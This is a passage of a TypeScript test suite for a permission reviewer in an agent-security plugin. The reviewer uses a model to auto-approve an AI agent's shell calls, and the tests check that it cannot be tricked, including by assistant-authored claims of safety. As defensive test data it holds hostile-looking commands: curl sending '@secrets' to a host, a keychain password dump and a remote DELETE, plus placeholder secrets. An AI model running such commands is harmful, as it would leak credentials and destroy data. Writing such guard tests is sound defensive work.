import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { decide, REVIEW_QUESTIONS, SYSTEM_ONE_ENDPOINT, SYSTEM_ONE_MODEL } from "../src/permission-review.ts";
import type { ReviewDependencies, ReviewFetch } from "../src/permission-review.ts";
import { fileReviewLog, MAX_LOG_BYTES, PAYLOAD_LOG_LIMITS, payloadLogPath, reviewLogPath } from "../src/review-log.ts";
import { loadConfig } from "../src/policy.ts";
import tuiPlugin, { createTuiListener, REASON_QUIET_MS } from "../src/tui.ts";
import { DEFAULT_PERMISSION_REVIEW, type GuardConfig, type PermissionReviewMode, type PermissionReviewSettings } from "../src/policy.ts";
import { createV1Hooks } from "../src/v1.ts";
import { setupV2 } from "../src/v2.ts";
import { host } from "./support.ts";

const policyPath = process.env.OPENCODE_SECRET_GUARD_CONFIG;
if (!policyPath) throw new Error("OPENCODE_SECRET_GUARD_CONFIG must be set");

let fixture: string;
let repo: string;
let packageLib: string;
let base: GuardConfig;
const savedStateHome = process.env.XDG_STATE_HOME;

beforeAll(() => {
  fixture = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "secret-guard-review-")));
  // Tests that keep the default decision log must not write to the real state directory.
  process.env.XDG_STATE_HOME = path.join(fixture, "state");
  repo = path.join(fixture, "repo");
  packageLib = path.join(fixture, "package", "lib");
  fs.mkdirSync(repo, { recursive: true });
  fs.mkdirSync(path.join(fixture, "package", "bin"), { recursive: true });
  fs.writeFileSync(path.join(fixture, "package", "bin", "opencode-secret-guard"), "#!/bin/sh\n");
  for (const file of [".env", "README.md"]) fs.writeFileSync(path.join(repo, file), "x\n");
  const loaded = loadConfig(policyPath);
  // The shell layer is covered elsewhere; the reviewer is independent of it.
  base = { ...loaded, mode: "files-only", secretEnvironment: [...loaded.secretEnvironment, "MY_VAULT"] };
  spawnSync(loaded.tools.git, ["init", "-q", repo]);
});

afterAll(() => {
  fs.rmSync(fixture, { recursive: true, force: true });
  if (savedStateHome === undefined) delete process.env.XDG_STATE_HOME;
  else process.env.XDG_STATE_HOME = savedStateHome;
});

const APPROVE = { explicitly_authorized: 0.97, confirmation_required: 0.02, high_impact: 0.03, within_scope: 0.96 };
type Answers = Record<string, number>;

const answerBody = (answers: Answers) =>
  JSON.stringify({
    model: "jev-1.13.0",
    answers: Object.fromEntries(Object.entries(answers).map(([key, value]) => [key, { type: "noul", noul: value }])),
    usage: { input_tokens: 1, output_tokens: 1 },
  });

/** A Response-like built without the DOM, so tests also see the shapes the transport relies on. */
function response(status: number, text: string, headers: Record<string, string> = {}) {
  const bytes = new TextEncoder().encode(text);
  let sent = false;
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: (name: string) => headers[name.toLowerCase()] ?? null },
    body: {
      getReader: () => ({
        read: async () => (sent ? { done: true } : ((sent = true), { done: false, value: bytes })),
        cancel: async () => {},
      }),
      cancel: async () => {},
    },
  };
}

interface World {
  session?: Record<string, unknown> | null;
  context?: unknown;
  credential?: unknown;
  connection?: unknown;
  fetch?: ReviewFetch;
  sessionDelay?: Promise<void>;
  events?: false;
  hang?: string;
}

const root = () => ({ id: "ses_1", location: { directory: repo } });
const HUMAN = [
  { type: "user", id: "m1", text: "Please run the test suite with `bun test` in this repository." },
  { type: "assistant", id: "msg_1", content: [] },
];

async function started(
  mode: PermissionReviewMode,
  world: World = {},
  overrides: Partial<ReviewDependencies> = {},
  settings: Partial<PermissionReviewSettings> = {},
) {
  const payloads: Array<Record<string, unknown>> = [];
  const requests: Array<{ url: string; init: any }> = [];
  const lines: string[] = [];
  const records: Array<Record<string, unknown>> = [];
  const counts = { session: 0, context: 0, active: 0, resolve: 0, fetch: 0 };
  const fetcher: ReviewFetch = async (url, init) => {
    counts.fetch++;
    requests.push({ url, init });
    return world.fetch ? world.fetch(url, init) : response(200, answerBody(APPROVE));
  };
  // A live event stream the test pushes into, ends or fails.
  const queue: unknown[] = [];
  let wake = () => {};
  let ended: "end" | "fail" | undefined;
  const stream = {
    async *[Symbol.asyncIterator]() {
      for (;;) {
        while (queue.length) yield queue.shift();
        if (ended === "fail") throw new Error("stream failed");
        if (ended === "end") return;
        await new Promise<void>((resolve) => (wake = resolve));
      }
    },
  };
  const subscribed: AbortSignal[] = [];
  const settle = () => new Promise((resolve) => setTimeout(resolve, 0));
  const events = {
    push: async (type: string, data: unknown) => (queue.push({ id: "e", type, created: 0, data }), wake(), settle()),
    end: async (how: "end" | "fail") => ((ended = how), wake(), settle()),
  };
  const fake = host(repo, undefined, {
    ...(world.events === false
      ? {}
      : { event: { subscribe: async ({ signal }: { signal: AbortSignal }) => (subscribed.push(signal), stream) } }),
    session: {
      get: async () => {
        counts.session++;
        await world.sessionDelay;
        return world.session === undefined ? root() : world.session;
      },
      context: async () => {
        counts.context++;
        const context = world.context === undefined ? HUMAN : world.context;
        return typeof context === "function" ? context() : context;
      },
    },
    integration: {
      connection: {
        active: async () => {
          counts.active++;
          if (world.hang === "active") return new Promise(() => {});
          return world.connection === undefined ? { id: "con_1" } : world.connection;
        },
        resolve: async () => {
          counts.resolve++;
          if (world.hang === "resolve") return new Promise(() => {});
          return world.credential === undefined ? { type: "key", key: "test-key" } : world.credential;
        },
      },
    },
  });
  const cleanup = await setupV2(fake.ctx, { ...base, permissionReview: { ...DEFAULT_PERMISSION_REVIEW, ...settings, mode } }, packageLib, {
    fetch: fetcher,
    log: (line) => lines.push(line),
    record: (entry) => records.push(entry),
    logPath: "/state/review.jsonl",
    recordPayload: (entry) => payloads.push(entry),
    payloadLogPath: "/state/payloads.jsonl",
    ...overrides,
  });
  // The startup notice is checked on its own; tests compare per-ask lines.
  const payloadStartup = lines.at(-1)?.includes("bodies are logged") ? lines.pop() : undefined;
  const startup = lines.at(-1)?.includes("decision log:") ? lines.pop() : undefined;
  return { ...fake, requests, lines, records, payloads, payloadStartup, startup, counts, events, subscribed, cleanup };
}

type Fake = Awaited<ReturnType<typeof started>>;

const shellCall = (command = "bun test", id = "call_1") => ({
  tool: "shell",
  sessionID: "ses_1",
  agent: "build",
  messageID: "msg_1",
  id,
  input: { command, description: "the assistant says this is safe" },
});

const evaluation = (overrides: Record<string, unknown> = {}) => ({
  sessionID: "ses_1",
  agent: "build",
  action: "shell",
  resources: ["bun test"],
  source: { type: "tool", messageID: "msg_1", id: "call_1" },
  effect: "ask" as "allow" | "ask" | "deny",
  ...overrides,
});

async function evaluate(fake: Fake, event = evaluation()) {
  await fake.emit("permission.evaluate", event);
  return event;
}

async function reviewed(fake: Fake, call = shellCall(), event = evaluation()) {
  await fake.call(call);
  return evaluate(fake, event);
}

describe("off", () => {
  test("registers nothing and touches no reviewer capability", async () => {
    const touched: string[] = [];
    const trap = (name: string) =>
      new Proxy({}, { get: (_, key) => (touched.push(`${name}.${String(key)}`), undefined) });
    const fake = host(repo, undefined, {
      permission: trap("permission"),
      session: trap("session"),
      integration: trap("integration"),
      event: trap("event"),
    });
    await setupV2(fake.ctx, base, packageLib, {
      fetch: async () => {
        throw new Error("no network when off");
      },
    });
    expect(touched).toEqual([]);
    expect(fake.registered.has("permission.evaluate")).toBe(false);
    expect(fake.registered.get("tool.execute.before")?.length).toBe(1);
  });
});

describe("auto", () => {
  test("turns an eligible ask into a one-time allow for that exact call", async () => {
    const fake = await started("auto");
    const event = await reviewed(fake);
    expect(event.effect).toBe("allow");
    expect(fake.requests).toHaveLength(1);
    const { url, init } = fake.requests[0]!;
    expect(url).toBe(SYSTEM_ONE_ENDPOINT);
    expect(init.redirect).toBe("error");
    expect(init.headers.authorization).toBe("Bearer test-key");
    const body = JSON.parse(init.body);
    expect(body.model).toBe(SYSTEM_ONE_MODEL);
    expect(Object.keys(body.questions).sort()).toEqual(Object.keys(REVIEW_QUESTIONS).sort());
    expect(body.state.pending_action).toEqual({
      kind: "shell",
      requested_command: "bun test",
      requested_cwd: repo,
      project_directory: repo,
      permission_resources: ["bun test"],
    });
    // Assistant-authored text is never evidence of human intent.
    expect(init.body).not.toContain("the assistant says this is safe");
    expect(body.state.user_messages).toEqual([HUMAN[0]!.text]);
    expect(fake.lines.join("\n")).not.toContain("test-key");
  });

  test("a second evaluation of another call is reviewed on its own", async () => {
    const fake = await started("auto");
    await reviewed(fake);
    const other = await evaluate(fake, evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } }));
    expect(other.effect).toBe("ask");
  });

  test("an incoming allow or deny is never reviewed or changed", async () => {
    const fake = await started("auto");
    await fake.call(shellCall());
    for (const effect of ["allow", "deny"] as const) {
      expect((await evaluate(fake, evaluation({ effect }))).effect).toBe(effect);
    }
    expect(fake.counts.fetch).toBe(0);
  });

  test("never denies, whatever the model says", async () => {
    const fake = await started("auto", {
      fetch: async () =>
        response(200, answerBody({ explicitly_authorized: 0, confirmation_required: 1, high_impact: 1, within_scope: 0 })),
    });
    expect((await reviewed(fake)).effect).toBe("ask");
  });

  test("an approving reviewer cannot unblock what the guard refuses", async () => {
    const fake = await started("auto");
    await expect(fake.call({ ...shellCall(), tool: "read", input: { path: ".env" } })).rejects.toThrow("blocked");
    const event = await evaluate(fake, evaluation({ action: "read", resources: [path.join(repo, ".env")] }));
    expect(event.effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("a credential-printing shell call the guard refuses is never reviewed", async () => {
    const fake = await started("auto");
    const command = "security find-generic-password -w -s x";
    await expect(fake.call(shellCall(command, "call_9"))).rejects.toThrow(/secret-guard/);
    const event = await evaluate(
      fake,
      evaluation({ resources: [command], source: { type: "tool", messageID: "msg_1", id: "call_9" } }),
    );
    expect(event.effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (call-unknown)"]);
    expect(fake.counts.fetch).toBe(0);
  });

  test("a write to the guard's own policy stays blocked", async () => {
    const fake = await started("auto");
    await expect(fake.call({ ...shellCall(), tool: "write", input: { path: "opencode.json", content: "{}" } }))
      .rejects.toThrow(/part of the guard/);
    expect((await evaluate(fake, evaluation({ action: "edit", resources: ["opencode.json"] }))).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("a compound command sends its original text and every parsed resource", async () => {
    const fake = await started("auto");
    const command = "bun install && bun test | tee out.txt";
    const resources = ["bun install", "bun test", "tee out.txt"];
    expect((await reviewed(fake, shellCall(command), evaluation({ resources }))).effect).toBe("allow");
    const action = JSON.parse(fake.requests[0]!.init.body).state.pending_action;
    expect(action.requested_command).toBe(command);
    expect(action.permission_resources).toEqual(resources);
  });

  test.each([
    ["explicitly_authorized", 0.9, "allow"],
    ["explicitly_authorized", 0.89, "ask"],
    ["within_scope", 0.9, "allow"],
    ["within_scope", 0.89, "ask"],
    ["confirmation_required", 0.1, "allow"],
    ["confirmation_required", 0.11, "ask"],
    ["high_impact", 0.1, "allow"],
    ["high_impact", 0.11, "ask"],
  ])("%s at %d gives %s", async (question, value, effect) => {
    const fake = await started("auto", { fetch: async () => response(200, answerBody({ ...APPROVE, [question]: value })) });
    expect((await reviewed(fake)).effect).toBe(effect);
  });

  test("a session lookup answering for another session stays a prompt", async () => {
    const fake = await started("auto", { session: { id: "ses_other", location: { directory: "/" } } });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("a credential in a parsed resource stays a prompt", async () => {
    const fake = await started("auto");
    const event = evaluation({ resources: ["bun test", "export GITHUB_TOKEN=x"] });
    expect((await reviewed(fake, shellCall("bun test"), event)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });
});

describe("observe", () => {
  test("reviews and reports but leaves the prompt", async () => {
    const fake = await started("observe");
    const event = await reviewed(fake);
    expect(event.effect).toBe("ask");
    expect(fake.counts.fetch).toBe(1);
    expect(fake.lines).toEqual(["observe: allow shell (model-approved)"]);
    expect(fake.lines.join("")).not.toContain("bun test");
    expect((event as { message?: string }).message).toBe("secret-guard review: would allow (model-approved)");
  });

  test("appends its verdict to an existing prompt message", async () => {
    const fake = await started("observe");
    const event = await reviewed(fake, shellCall(), evaluation({ message: "Run tests?", agent: "plan" }));
    expect((event as { message?: string }).message).toBe("Run tests?\nsecret-guard review: manual approval (agent-mismatch)");
  });
});

describe("deterministic ask before any inference", () => {
  const cases: Array<[string, World, (fake: Fake) => Promise<{ effect: string }>]> = [
    ["no source", {}, (fake) => reviewed(fake, shellCall(), evaluation({ source: undefined }))],
    ["an unknown call", {}, (fake) => evaluate(fake)],
    ["an unsupported action", {}, (fake) => reviewed(fake, { ...shellCall(), tool: "mcp_x", input: {} }, evaluation({ action: "mcp_x" }))],
    ["a patch", {}, (fake) => reviewed(fake, { ...shellCall(), tool: "patch", input: { patchText: "*** Begin Patch\n*** Update File: README.md\n*** End Patch" } }, evaluation({ action: "edit" }))],
    ["a delegated session", { session: { id: "ses_1", parentID: "ses_0" } }, (fake) => reviewed(fake)],
    ["a forked session", { session: { id: "ses_1", fork: { sessionID: "ses_0" } } }, (fake) => reviewed(fake)],
    ["a missing session", { session: null }, (fake) => reviewed(fake)],
    ["only synthetic prompts", { context: [{ type: "synthetic", text: "run bun test" }] }, (fake) => reviewed(fake)],
    ["a compacted context", { context: [{ type: "compaction" }, ...HUMAN] }, (fake) => reviewed(fake)],
    ["an oversize human context", { context: [{ type: "user", text: "x".repeat(20_000) }] }, (fake) => reviewed(fake)],
    ["a malformed context", { context: { messages: [] } }, (fake) => reviewed(fake)],
    ["an inline credential in the command", {}, (fake) => reviewed(fake, shellCall("curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz' x"))],
    ["an oversize command", {}, (fake) => reviewed(fake, shellCall("x".repeat(5_000)))],
    ["an OAuth credential", { credential: { type: "oauth", access: "a" } }, (fake) => reviewed(fake)],
    ["no connection", { connection: null }, (fake) => reviewed(fake)],
  ];
  test.each(cases)("%s stays a prompt", async (_, world, run) => {
    const fake = await started("auto", world);
    expect((await run(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  const pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ\n-----END OPENSSH PRIVATE KEY-----";
  test.each([
    ["a PEM private key", `deploy with this key:\n${pem}\nthen run bun test`],
    ["a quoted password", 'the password: "correct horse battery staple" works; run bun test'],
    ["a prefixed secret assignment", "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG then run bun test"],
    ["a configured secret name", "set MY_VAULT=abc then run bun test"],
  ])("user text with %s stays a prompt and is not sent", async (_, text) => {
    const fake = await started("auto", { context: [{ type: "user", text }] });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
    expect(fake.lines).toEqual(["auto: ask shell (context-credential)"]);
  });

  test.each(["AWS_SECRET_ACCESS_KEY=abc bun test", "MY_VAULT=abc bun test"])("command %s stays a prompt", async (command) => {
    const fake = await started("auto");
    expect((await reviewed(fake, shellCall(command), evaluation({ resources: [command] }))).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  const tool = (error: unknown) => ({
    type: "assistant",
    id: "msg_0",
    content: [{ type: "tool", id: "t0", name: "shell", state: { status: "error", input: {}, error } }],
  });
  test.each([
    ["a plain decline", tool({ type: "aborted", message: "The user declined this tool call" }), "context-rejected"],
    ["an interrupted step", { type: "assistant", id: "msg_0", content: [], error: { type: "aborted", message: "Step interrupted" } }, "context-rejected"],
    ["an attached file", { type: "user", id: "m0", text: "see notes", files: [{ data: "", mime: "text/markdown", source: { type: "uri", uri: "file:///repo/NOTES.md" } }] }, "context-attachment"],
    ["an attached skill", { type: "user", id: "m0", text: "use it", skills: [{ id: "careful", name: "careful", text: "Always ask before running tests." }] }, "context-attachment"],
    ["malformed files", { type: "user", id: "m0", text: "x", files: "NOTES.md" }, "context-shape"],
    ["malformed skills", { type: "user", id: "m0", text: "x", skills: {} }, "context-shape"],
  ])("saved history with %s stays a prompt on a fresh reviewer", async (_, message, reason) => {
    const fake = await started("auto", { context: [message, ...HUMAN] });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual([`auto: ask shell (${reason})`]);
    expect(fake.counts.fetch).toBe(0);
  });

  test("empty attachment lists and agent mentions are fine", async () => {
    const fake = await started("auto", { context: [{ ...HUMAN[0]!, files: [], skills: [], agents: [{ name: "x" }] }, HUMAN[1]] });
    expect((await reviewed(fake)).effect).toBe("allow");
  });

  test("a refused permission earlier in the session stays a prompt", async () => {
    const rejected = {
      type: "assistant",
      id: "msg_0",
      content: [{ type: "tool", id: "t0", name: "shell", state: { status: "error", input: {}, error: { type: "permission.rejected", message: "not now" } } }],
    };
    const fake = await started("auto", { context: [HUMAN[0], rejected, HUMAN[1]] });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (context-rejected)"]);
    expect(fake.counts.fetch).toBe(0);
  });

  test.each([
    ["an OAuth credential", { credential: { type: "oauth", access: "a" } }],
    ["no connection", { connection: null }],
  ])("%s is found before the transcript is read", async (_, world) => {
    const fake = await started("auto", world);
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.counts.context).toBe(0);
  });

  test("ineligible actions never resolve a credential", async () => {
    const fake = await started("auto");
    await reviewed(fake, { ...shellCall(), tool: "mcp_x", input: {} }, evaluation({ action: "mcp_x" }));
    expect(fake.counts.active + fake.counts.resolve + fake.counts.session).toBe(0);
  });

  test("a mismatched agent stays a prompt", async () => {
    const fake = await started("auto");
    expect((await reviewed(fake, shellCall(), evaluation({ agent: "plan" }))).effect).toBe("ask");
  });
});

describe("model and transport failures leave the prompt", () => {
  const cases: Array<[string, ReviewFetch]> = [
    ["a negative judgment on a remote destructive command", async () =>
      response(200, answerBody({ ...APPROVE, high_impact: 0.95 }))],
    ["a required confirmation", async () => response(200, answerBody({ ...APPROVE, confirmation_required: 0.6 }))],
    ["weak authorization", async () => response(200, answerBody({ ...APPROVE, explicitly_authorized: 0.7 }))],
    ["a missing answer", async () => {
      const { within_scope, ...rest } = APPROVE;
      return response(200, answerBody(rest));
    }],
    ["an out-of-range probability", async () => response(200, answerBody({ ...APPROVE, within_scope: 1.5 }))],
    ["a non-numeric probability", async () =>
      response(200, answerBody(APPROVE).replace('"noul":0.96', '"noul":"0.96"'))],
    ["malformed JSON", async () => response(200, "{")],
    ["an HTTP error", async () => response(503, answerBody(APPROVE))],
    ["an unauthorised key", async () => response(401, "{}")],
    ["a declared oversize body", async () => response(200, answerBody(APPROVE), { "content-length": "1000000" })],
    ["an actual oversize body", async () => response(200, " ".repeat(70_000) + answerBody(APPROVE))],
    ["a network error", async () => {
      throw new TypeError("fetch failed");
    }],
  ];
  test.each(cases)("%s", async (_, fetch) => {
    const fake = await started("auto", { fetch });
    expect((await reviewed(fake)).effect).toBe("ask");
  });

  test("the deadline covers the host calls before the request", async () => {
    const fake = await started("auto", { sessionDelay: new Promise(() => {}) }, { deadlineMs: 20 });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
    expect(fake.lines[0]).toContain("deadline");
  });

  const never = () => new Promise<never>(() => {});
  test.each([
    ["the context", { context: () => never() }],
    ["the active connection", { connection: undefined, hang: "active" }],
    ["credential resolution", { hang: "resolve" }],
  ] as Array<[string, World & { hang?: string }]>)("a hang in %s ends at the deadline", async (_, world) => {
    const fake = await started("auto", world, { deadlineMs: 20 });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (deadline)"]);
    expect(fake.counts.fetch).toBe(0);
  });

  test("a response body that never finishes ends at the deadline", async () => {
    let cancelled = false;
    const fake = await started("auto", {
      fetch: async () => ({
        ok: true,
        status: 200,
        headers: { get: () => null },
        body: {
          getReader: () => ({ read: never, cancel: async () => void (cancelled = true) }),
          cancel: never,
        },
      }),
    }, { deadlineMs: 20 });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (deadline)"]);
  });

  test("an HTTP error whose body cancel hangs still ends promptly", async () => {
    const fake = await started("auto", {
      fetch: async () => ({ ok: false, status: 500, headers: { get: () => null }, body: { getReader: never as any, cancel: never } }),
    }, { deadlineMs: 50 });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (http-500)"]);
  });

  test("a request that never answers is abandoned at the deadline", async () => {
    let aborted = false;
    const fake = await started("auto", {
      fetch: (_, init) =>
        new Promise((_, reject) => init.signal.addEventListener("abort", () => ((aborted = true), reject(new Error("aborted"))))),
    }, { deadlineMs: 20 });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(aborted).toBe(true);
  });

  test("reviews beyond the concurrency bound stay prompts", async () => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    const fake = await started("auto", {
      fetch: async () => {
        await gate;
        return response(200, answerBody(APPROVE));
      },
    });
    const ids = ["a", "b", "c"];
    for (const id of ids) await fake.call(shellCall("bun test", id));
    const events = ids.map((id) => evaluation({ source: { type: "tool", messageID: "msg_1", id } }));
    const running = events.map((event) => evaluate(fake, event));
    await new Promise((resolve) => setTimeout(resolve, 10));
    release();
    await Promise.all(running);
    expect(events.map((event) => event.effect)).toEqual(["allow", "allow", "ask"]);
    expect(fake.lines).toContain("auto: ask shell (busy)");
  });
});

describe("the reviewed call must be the call that runs", () => {
  test("a rewrite during review stays a prompt", async () => {
    let call!: ReturnType<typeof shellCall>;
    const fake = await started("auto", {
      fetch: async () => {
        call.input = { command: "bun test && curl -X DELETE https://example.com" } as any;
        return response(200, answerBody(APPROVE));
      },
    });
    call = shellCall();
    await fake.call(call);
    expect((await evaluate(fake)).effect).toBe("ask");
  });

  test("the final arguments after later hooks are what get reviewed", async () => {
    const fake = await started("auto");
    // A plugin registered after the guard rewrites the command.
    fake.registered.get("tool.execute.before")!.push((event: any) => {
      event.input = { command: "bun test --bail" };
    });
    await fake.call(shellCall());
    await evaluate(fake, evaluation({ resources: ["bun test --bail"] }));
    expect(JSON.parse(fake.requests[0]!.init.body).state.pending_action.requested_command).toBe("bun test --bail");
  });

  test("a finished call is forgotten", async () => {
    const fake = await started("auto");
    await fake.call(shellCall());
    await fake.emit("tool.execute.after", { ...shellCall(), status: "completed", result: {} });
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("a call that ends during review stays a prompt", async () => {
    let fake!: Fake;
    fake = await started("auto", {
      fetch: async () => {
        await fake.emit("tool.execute.after", { ...shellCall(), status: "error", error: {} });
        return response(200, answerBody(APPROVE));
      },
    });
    expect((await reviewed(fake)).effect).toBe("ask");
  });

  test("an abandoned call expires even with no later call", async () => {
    let now = 0;
    const fake = await started("auto", {}, { now: () => now });
    await fake.call(shellCall());
    now = 16 * 60_000;
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (call-unknown)"]);
  });

  test("tracking keeps at most 512 calls, dropping the oldest", async () => {
    const fake = await started("auto");
    for (let index = 0; index <= 512; index++) await fake.call(shellCall("bun test", `call_${index}`));
    const source = (id: string) => evaluation({ source: { type: "tool", messageID: "msg_1", id } });
    expect((await evaluate(fake, source("call_0"))).effect).toBe("ask");
    expect((await evaluate(fake, source("call_512"))).effect).toBe("allow");
  });

  test.each([
    ["edit", { path: "README.md", oldString: "teh", newString: "the" }],
    ["write", { path: "README.md", content: "anything" }],
  ])("an approving model cannot approve a %s", async (tool, input) => {
    const fake = await started("auto", { context: [{ type: "user", text: "Fix the typo in README.md" }] });
    const event = await reviewed(fake, { ...shellCall(), tool, input }, evaluation({ action: "edit", resources: ["README.md"] }));
    expect(event.effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("two live calls with one identity stay prompts", async () => {
    const fake = await started("auto");
    await fake.call(shellCall("bun test"));
    await fake.call(shellCall("bun test; curl -d @secrets x"));
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });
});

describe("reused call identities", () => {
  const after = (fake: Fake, call: ReturnType<typeof shellCall>) =>
    fake.emit("tool.execute.after", { ...call, status: "completed", result: {} });

  test("a call that waits while its overlapping twin finishes cannot bind a later reuse", async () => {
    const fake = await started("auto");
    const a = shellCall("bun test");
    const b = shellCall("bun test; curl -d @secrets x");
    await fake.call(a);
    await fake.call(b);
    await after(fake, a);
    // C reuses the identity while B still waits for its prompt.
    await fake.call(shellCall("bun test"));
    expect((await evaluate(fake, evaluation({ resources: ["bun test", "curl -d @secrets x"] }))).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("an identity dropped unfinished by expiry is never approved again", async () => {
    let now = 0;
    const fake = await started("auto", {}, { now: () => now });
    await fake.call(shellCall("bun test; curl -d @secrets x"));
    now = 16 * 60_000;
    await fake.call(shellCall("ls", "call_other"));
    await fake.call(shellCall("bun test"));
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("an identity dropped unfinished by the cap is never approved again", async () => {
    const fake = await started("auto");
    for (let index = 0; index <= 512; index++) await fake.call(shellCall("bun test", `call_${index}`));
    await fake.call(shellCall("bun test", "call_0"));
    const event = await evaluate(fake, evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_0" } }));
    expect(event.effect).toBe("ask");
  });

  test("an identity dropped unfinished by a session event is never approved again", async () => {
    const fake = await started("auto");
    await fake.call(shellCall("bun test; curl -d @secrets x"));
    await fake.events.push("session.inbox.enqueued", { sessionID: "ses_1", inboxID: "m9", item: { type: "user" } });
    await fake.call(shellCall("bun test"));
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("another tool finishing under the same identity does not clear a waiting shell call", async () => {
    const fake = await started("auto");
    await fake.call(shellCall("bun test; curl -d @secrets x"));
    const read = { ...shellCall(), tool: "read", input: { path: "README.md" } };
    await fake.call(read);
    await fake.emit("tool.execute.after", { ...read, status: "completed", result: {} });
    await fake.call(shellCall("bun test"));
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test("a completed call's identity can be used again", async () => {
    const fake = await started("auto");
    const call = shellCall();
    await fake.call(call);
    await after(fake, call);
    expect((await reviewed(fake)).effect).toBe("allow");
  });

  test("once 1,024 identities are unsafe, no call is approved", async () => {
    const fake = await started("auto");
    for (let index = 0; index < 1_024; index++) {
      await fake.call(shellCall("bun test", `dup_${index}`));
      await fake.call(shellCall("bun test", `dup_${index}`));
    }
    expect((await reviewed(fake, shellCall("bun test", "fresh"), evaluation({ source: { type: "tool", messageID: "msg_1", id: "fresh" } }))).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });
});

describe("re-evaluation", () => {
  test("a repeated evaluation of a reviewed call asks without inference", async () => {
    const fake = await started("auto");
    await reviewed(fake);
    expect((await evaluate(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(1);
  });

  test("a repeat while the first review is in flight asks", async () => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    const fake = await started("auto", {
      fetch: async () => (await gate, response(200, answerBody(APPROVE))),
    });
    await fake.call(shellCall());
    const first = evaluate(fake);
    const second = await evaluate(fake);
    release();
    expect(second.effect).toBe("ask");
    expect((await first).effect).toBe("allow");
    expect(fake.counts.fetch).toBe(1);
  });

  test("a call refused as busy is not reviewed on re-evaluation", async () => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    const fake = await started("auto", { fetch: async () => (await gate, response(200, answerBody(APPROVE))) });
    for (const id of ["a", "b", "c"]) await fake.call(shellCall("bun test", id));
    const source = (id: string) => evaluation({ source: { type: "tool", messageID: "msg_1", id } });
    const running = [evaluate(fake, source("a")), evaluate(fake, source("b"))];
    expect((await evaluate(fake, source("c"))).effect).toBe("ask");
    release();
    await Promise.all(running);
    expect((await evaluate(fake, source("c"))).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(2);
  });
});

describe("working directory", () => {
  test("a relative workdir is sent resolved against the location", async () => {
    fs.mkdirSync(path.join(repo, "pkg"), { recursive: true });
    const fake = await started("auto");
    const call = shellCall();
    call.input = { ...call.input, workdir: "pkg" } as any;
    expect((await reviewed(fake, call)).effect).toBe("allow");
    expect(JSON.parse(fake.requests[0]!.init.body).state.pending_action.requested_cwd).toBe(path.join(repo, "pkg"));
  });

  test.each(["..", "/", "~", "~/x"])("workdir %s outside the location stays a prompt", async (workdir) => {
    const fake = await started("auto");
    const call = shellCall();
    call.input = { ...call.input, workdir } as any;
    expect((await reviewed(fake, call)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });

  test.each([
    ["another location", () => ({ id: "ses_1", location: { directory: "/elsewhere" } })],
    ["no location", () => ({ id: "ses_1" })],
    ["a subpath", () => ({ ...root(), subpath: "pkg" })],
  ])("a session in %s stays a prompt", async (_, session) => {
    const fake = await started("auto", { session: session() });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(0);
  });
});

describe("lifecycle", () => {
  const gated = () => {
    let release!: () => void;
    let reached!: () => void;
    const inFlight = new Promise<void>((resolve) => (reached = resolve));
    const gate = new Promise<void>((resolve) => (release = resolve));
    const fetch: ReviewFetch = async () => {
      reached();
      await gate;
      return response(200, answerBody(APPROVE));
    };
    return { fetch, inFlight, release };
  };

  test.each([
    ["session.execution.interrupted", { sessionID: "ses_1", reason: "user" }],
    ["session.inbox.enqueued", { sessionID: "ses_1", inboxID: "m9", item: { type: "user" } }],
    ["session.moved", { sessionID: "ses_1", location: { directory: "/x" }, projectID: "p" }],
    ["session.deleted", { sessionID: "ses_1" }],
